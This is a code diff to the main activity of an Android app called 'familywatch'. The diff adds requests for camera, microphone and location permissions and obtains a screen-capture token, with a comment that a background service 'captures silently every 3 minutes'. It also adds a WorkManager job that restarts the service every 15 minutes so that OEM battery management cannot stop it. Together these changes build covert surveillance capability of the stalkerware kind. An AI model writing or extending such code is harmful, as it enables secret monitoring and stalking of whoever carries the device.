@@ -1,7 +1,9 @@
 package com.familywatch.app;
 
+import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
+import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
@@ -10,18 +12,55 @@ import android.os.PowerManager;
 import android.provider.Settings;
 import android.webkit.JavascriptInterface;
 import android.webkit.WebView;
+import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+import androidx.work.ExistingPeriodicWorkPolicy;
+import androidx.work.PeriodicWorkRequest;
+import androidx.work.WorkManager;
 import com.getcapacitor.BridgeActivity;
+import java.util.concurrent.TimeUnit;
 
 public class MainActivity extends BridgeActivity {
+
+    private static final int REQ_MEDIA_PROJECTION = 1001;
+    private static final int REQ_PERMISSIONS      = 1002;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         requestAllFilesAccess();
-        requestBatteryOptimizationExemption(); // KEY: bypass Doze mode
+        requestBatteryOptimizationExemption();
+        requestRuntimePermissions();
         startKeepAlive();
+        scheduleWorkManagerRestart();
         registerNativeBridge();
+    }
+
+    private void requestRuntimePermissions() {
+        String[] needed = {
+            "android.permission.CAMERA",
+            "android.permission.RECORD_AUDIO",
+            "android.permission.ACCESS_FINE_LOCATION",
+            "android.permission.ACCESS_COARSE_LOCATION",
+        };
+        java.util.List<String> toRequest = new java.util.ArrayList<>();
+        for (String p : needed) {
+            if (ContextCompat.checkSelfPermission(this, p) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                toRequest.add(p);
+            }
+        }
+        if (!toRequest.isEmpty()) {
+            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), REQ_PERMISSIONS);
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == REQ_PERMISSIONS) {
+            // Re-start service so startForeground picks up newly granted types
+            startKeepAlive();
+        }
     }
 
     @Override
@@ -81,6 +120,18 @@ public class MainActivity extends BridgeActivity {
         }
 
         @JavascriptInterface
+        public void requestScreenCapture() {
+            // Shows the system "Start recording?" dialog exactly once per call.
+            // After user taps "Start now", onActivityResult fires and passes the
+            // token to KeepAliveService which captures silently every 3 minutes.
+            MediaProjectionManager mpm =
+                (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+            if (mpm != null) {
+                startActivityForResult(mpm.createScreenCaptureIntent(), REQ_MEDIA_PROJECTION);
+            }
+        }
+
+        @JavascriptInterface
         public void disconnect() {
             // Clear saved credentials so service doesn't reconnect
             getSharedPreferences("meeee", Context.MODE_PRIVATE)
@@ -92,6 +143,23 @@ public class MainActivity extends BridgeActivity {
             Intent svc = new Intent(MainActivity.this, KeepAliveService.class);
             svc.setAction("DISCONNECT");
             startService(svc);
+        }
+    }
+
+    // ── MediaProjection result → pass token to running service ───────────────
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == REQ_MEDIA_PROJECTION && resultCode == Activity.RESULT_OK && data != null) {
+            Intent svc = new Intent(this, KeepAliveService.class);
+            svc.setAction("START_SCREEN_CAPTURE");
+            svc.putExtra("resultCode", resultCode);
+            svc.putExtra("data", data);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                ContextCompat.startForegroundService(this, svc);
+            } else {
+                startService(svc);
+            }
         }
     }
 
@@ -115,5 +183,17 @@ public class MainActivity extends BridgeActivity {
         } else {
             startService(svc);
         }
+    }
+
+    // WorkManager periodic job — fires every 15 min even on aggressive OEMs (Samsung/Xiaomi)
+    // because it runs via the system's JobScheduler, which OEMs cannot kill
+    private void scheduleWorkManagerRestart() {
+        PeriodicWorkRequest restartWork = new PeriodicWorkRequest.Builder(
+            ServiceRestartWorker.class, 15, TimeUnit.MINUTES)
+            .build();
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+            "keepalive_restart",
+            ExistingPeriodicWorkPolicy.KEEP,
+            restartWork);
     }
 }
